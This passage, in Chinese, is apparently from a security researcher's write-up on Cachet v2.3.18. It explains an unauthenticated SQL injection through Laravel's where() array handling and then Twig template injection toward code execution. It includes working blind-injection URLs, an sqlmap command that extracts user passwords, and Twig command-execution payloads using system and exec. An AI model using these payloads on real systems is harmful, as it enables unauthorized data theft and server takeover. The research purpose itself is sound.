    DB::table('dual')->where('id', 1);
    // 生成的WHERE条件是：WHERE id = 1
如果传入的是三个参数，则第二个参数会认为是条件表达式中的符号，比如：
    DB::table('dual')->where('id', '>', 18);
    // 生成的WHERE条件是：WHERE id > 18
当然where也是支持传入数组的，我看可以将多个条件组合成一个数组传入where函数中，比如：
    DB::table('dual')->where([
        ['id', '>', '18'],
        ['title', 'LIKE', '%example%']
    ]);
    // 生成的WHERE条件是：WHERE id > 18 AND title LIKE '%example%'
那么，思考下面三个代码在Laravel中是否可能导致SQL注入：
  * `where($input, '=', 1)` 当where的第一个参数被用户控制
  * `where('id', $input, 1)` 当where的第二个参数被用户控制，且存在第三个参数
  * `where($input)` 当where只有一个参数且被用户控制
这三个代码对应着不同情况，第一种是key被控制，第二种是符号被控制，第三种是整个条件都被控制。
测试的过程就不说了，经过测试，我获取了下面的结果：
  * 当第一个参数key可控时，传入任意字符串都会报错，具体的错误为“unknown column”，但类似反引号、双引号这样的定界符将会被转义，所以无法逃逸出field字段进行注入
  * 当第二个参数符号可控时，输入非符号字符不会有任何报错，也不存在注入
  * 当整体可控时，相当于可以传入多个key、符号和value，但经过前两者的测试，key和符号位都是不能注入的，value就更不可能
仿佛又陷入了困境。
我尝试debug进入`where()`函数看了看它内部的实现，`src/Illuminate/Database/Query/Builder.php`：
    public function where($column, $operator = null, $value = null, $boolean = 'and')
    {
        // If the column is an array, we will assume it is an array of key-value pairs
        // and can add them each as a where clause. We will maintain the boolean we
        // received when the method was called and pass it into the nested where.
        if (is_array($column)) {
            return $this->addArrayOfWheres($column, $boolean);
        }
        // ...
        // If the given operator is not found in the list of valid operators we will
        // assume that the developer is just short-cutting the '=' operators and
        // we will set the operators to '=' and set the values appropriately.
        if (! in_array(strtolower($operator), $this->operators, true) &&
            ! in_array(strtolower($operator), $this->grammar->getOperators(), true)) {
            list($value, $operator) = [$operator, '='];
        } 
当第一个参数是数组时，将会执行到`addArrayOfWheres()`方法。另外从上面的第二个if语句也可以看出，这里面对参数`$operator`做了校验，这也是其无法注入的原因。
跟进一下`addArrayOfWheres()`方法：
    protected function addArrayOfWheres($column, $boolean, $method = 'where')
    {
        return $this->whereNested(function ($query) use ($column, $method) {
            foreach ($column as $key => $value) {
                if (is_numeric($key) && is_array($value)) {
                    call_user_func_array([$query, $method], $value);
                } else {
                    $query->$method($key, '=', $value);
                }
            }
        }, $boolean);
    }
    public function whereNested(Closure $callback, $boolean = 'and')
    {
        $query = $this->forNestedWhere();
        call_user_func($callback, $query);
        return $this->addNestedWhereQuery($query, $boolean);
    }
可以观察到，这里面有个很重要的回调，遍历了用户输入的第一个数组参数`$column`，当发现其键名是一个数字，且键值是一个数组时，将会调用`[$query,
$method]`，也就是`$this->where()`，并将完整的`$value`数组作为参数列表传入。
这个过程就是为了实现上面说到的`where()`的第三种用法：
    DB::table('dual')->where([    ['id', '>', '18'],    ['title', 'LIKE', '%example%']]);
所以，通过这个方法，我可以做到了一件事情： **从控制`where()`的第一个参数，到能够完整控制`where()`的所有参数**。
那么，再回看where函数的参数列表：
    public function where($column, $operator = null, $value = null, $boolean = 'and')
第四个`$boolean`参数就格外显眼了，这是控制WHERE条件连接逻辑的参数，默认是and。这个`$boolean`既不是SQL语句中的“键”，也不是SQL语句中的“值”，而就是SQL语句的代码，如果没有校验，一定存在SQL注入。
事实证明，这里并没有经过校验。我将debug模式打开，并注释了抑制报错的逻辑，即可在页面上看到SQL注入的报错：
`1[3]`参数可以注入任何语句，所以这里存在一个SQL注入漏洞。而且因为这个API接口是GET请求，所以无需用户权限，这是一个无限制的前台SQL注入。
Laravel的这个数组特性可以类比于6年前我第一次发现的ThinkPHP3系列SQL注入。当时的ThinkPHP注入是我在乌云乃至安全圈站稳脚跟的一批漏洞，它开创了使用数组进行框架ORM注入的先河，其影响和其后续类似的漏洞也一直持续到今天。遗憾的是，Laravel的这个问题是出现在`where()`的第一个参数，官方并不认为这是框架的问题。
## 0x04 SQL注入利用
回到Cachet。默认情况下Cachet的任何报错都不会有详情，只会返回一个500错误。且Laravel不支持堆叠注入，那么要利用这个漏洞，就有两种方式：
  * 通过UNION SELECT注入直接获取数据
  * 通过BOOL盲注获取数据
UNION肯定是最理想的，但是这里无法使用，原因是用户的这个输入会经过两次字段数量不同的SQL语句，会导致其中至少有一个SQL语句在UNION
SELECT的时候出错而退出。
Bool盲注没有任何问题，我本地是Postgres数据库，所以以其为例。
构造一个能够显示数据的请求：
    http://127.0.0.1:8080/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)+--+
将and 1=1修改为and 1=2，数据消失了：
    http://127.0.0.1:8080/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=2)+--+
说明盲注可以利用，于是我选择使用SQLMap来利用漏洞。SQLMap默认情况下将整个参数替换成SQL注入的Payload，而这个注入点需要前缀和后缀，需要对参数进行修改。
我先使用一个能够爆出数据的URL，比如`/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)+--+`，在这个括号后面增加个星号，然后作为`-u`目标进行检测即可：
    python sqlmap.py -u "http://127.0.0.1:8080/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+"
注入点被SQLMap识别了。因为表结构已经知道，成功获取用户、密码：
## 0x05 后台代码审计
这个注入漏洞的优势是无需用户权限，但劣势是无法堆叠执行，原因我在星球的这篇帖子里有介绍过（虽然帖子里说的是ThinkPHP）。主要是在初始化PDO的时候设置了`PDO::ATTR_EMULATE_PREPARES`为false，而数据库默认的参数化查询不允许prepare多个SQL语句。
无法堆叠执行的结果就是没法执行UPDATE语句，我只能通过注入获取一些信息，想要进一步执行代码，还需要继续审计。
接下来的审计我主要是在看后台逻辑，挖掘后台漏洞建议是黑盒结合白盒，这样会更快，原因是后台可能有很多常见的敏感操作，比如文件上传、编辑等，这些操作有时候可能直接抓包一改就能测出漏洞，都不需要代码审计了。
Cachet的后台还算相对安全，没有文件操作的逻辑，唯一一个上传逻辑是“Banner Image”的修改，但并不存在漏洞。
这时候我关注到了一个功能，Incident Templates，用于在报告事故的时候简化详情填写的操作。这个功能支持解析Twig模板语言：
对于Twig模板的解析是在API请求中，用API创建或编辑Incident对象的时候会使用到Incident Templates，进而执行模板引擎。
利用时需要现在Web后台添加一个Incident
Template，填写好Twig模板，记下名字。再发送下面这个数据包来执行名为“ssti”的模板，获得结果：
    POST /api/v1/incidents HTTP/1.1
    Host: localhost:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Connection: close
    X-Cachet-Token: QLGMRm5N8bUjVxbdLF6m
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 42
    visible=0&status=1&name=demo&template=ssti
其中X-Cachet-Token是注入时获取的用户的API Key。我添加了一个内容是`{{ 233 * 233 }}`的Incident
Template，渲染结果被成功返回在API的结果中：
Twig是PHP的一个著名的模板引擎，相比于其他语言的模板引擎，它提供了更安全的沙盒模式。默认模式下模板引擎没有特殊限制，而沙盒模式下只能使用白名单内的tag和filter。
Cachet中没有使用沙盒模式，所以我不做深入研究。普通模式想要执行恶意代码，需要借助一些内置的tag、filter，或者上下文中的危险对象。在Twig
v1.41、v2.10和v3后，增加了`map`和`filter`这两个filter，可以直接用来执行任意函数：
    {{["id"]|filter("system")|join(",")}}
    {{["id"]|map("system")|join(",")}}
但是Cachet v2.3.18中使用的是v1.40.1，刚好不存在这两个filter。那么旧版本如何来利用呢？
PortSwigger曾在2015年发表过一篇模板注入的文章《Server-Side Template
Injection》，里面介绍过当时的Twig模板注入方法：
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
`_self`是Twig中的一个默认的上下文对象，指代的是当前Template，其中的`env`属性是一个`Twig_Environment`对象。`Twig_Environment`类的`registerUndefinedFilterCallback`和`getFilter`就用来注册和执行回调函数，通过这两次调用，即可构造一个任意命令执行的利用链。
但是，这个执行命令的方法在Twig
v1.20.0中被官方修复了：https://github.com/twigphp/Twig/blob/1.x/CHANGELOG#L430，修复方法是发现object是当前对象时，则不进行属性的获取，下面这个if语句根本不会进去：
    // object property
    if (self::METHOD_CALL !== $type && !$object instanceof self) { // Twig_Template does not have public properties, and we don't want to allow access to internal ones
        if (isset($object->$item) || array_key_exists((string) $item, $object)) {
            if ($isDefinedTest) {
                return true;
            }
            if ($this->env->hasExtension('sandbox')) {
                $this->env->getExtension('sandbox')->checkPropertyAllowed($object, $item);
            }
            return $object->$item;
        }
    }
这个修改逻辑是科学的，因为Twig中正常只允许访问一个对象的public属性和方法，但因为`_self`指向的是`$this`，而`$this`可以访问父类的protected属性，所以才绕过了对作用域的限制，访问到了`env`。这个修复对此作了加强，让`_self`的表现和其他对象相同了。
另外，`_self.getEnvironment()`原本也可以访问`env`，这个修复也一起被干掉了。
Cachet使用rcrowe/twigbridge来将twig集成进Laravel框架，按照composer.lock中的版本号来肯定高于v1.20.0（实际是v1.40.1），也就是说，我也无法使用这个Payload做命令执行。
## 0x06 寻找Twig利用链与代码执行
Cachet中使用了下面这段代码来渲染Twig模板：
    protected function parseIncidentTemplate($templateSlug, $vars)
    {
        if ($vars === null) {
            $vars = [];
        }
        $this->twig->setLoader(new Twig_Loader_String());